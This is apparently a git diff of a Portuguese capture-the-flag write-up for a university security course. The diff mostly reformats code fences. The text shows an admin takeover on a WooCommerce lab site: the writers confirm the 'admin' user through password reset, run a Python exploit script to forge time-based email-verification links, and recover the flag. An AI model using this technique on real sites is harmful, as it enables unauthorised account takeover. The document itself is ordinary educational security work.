@@ -25,12 +25,12 @@ Ao descobrir a vulnerabilidade do site, foi possível obter um script em Python 
 Como é possível descobrir se um username existe ou não quando se realiza um pedido de reset de password, testamos o username "admin". Verificando-se que este existe, realizamos o pedido de reset.
 Como normalmente o id do admin é igual a 1, o próximo passo foi correr o script em python da seguinte maneira.
 
-````
+``` bash
 $ python3 script.py http://ctf-fsi.fe.up.pt:5001 1
-````
+```
 Que nos deu estes resultados
 
-````
+```
 #0 link for hash 1dc5a859697e220af9decfc1e158ebec:
 http://ctf-fsi.fe.up.pt:5001/my-account/?wcj_verify_email=eyJpZCI6IjEiLCJjb2RlIjoiMWRjNWE4NTk2OTdlMjIwYWY5ZGVjZmMxZTE1OGViZWMifQ
 
@@ -40,16 +40,16 @@ http://ctf-fsi.fe.up.pt:5001/my-account/?wcj_verify_email=eyJpZCI6IjEiLCJjb2RlIj
 #2 link for hash 185893239b043ef2bcd6cf01b6007db4:
 http://ctf-fsi.fe.up.pt:5001/my-account/?wcj_verify_email=eyJpZCI6IjEiLCJjb2RlIjoiMTg1ODkzMjM5YjA0M2VmMmJjZDZjZjAxYjYwMDdkYjQifQ
 
-````
+```
 
 O que o script faz é formar um link de validação de login com o token codificado através da hora atual.
 
 Ao aceder a um destes links, temos então acesso à conta de administrador do site. 
 De seguida seguimos o guião e encontramos a flag num post privado. 
 
-````
+```
 flag{please don't bother me}
-````
+```
 
 
 ### Vulnerabilidades
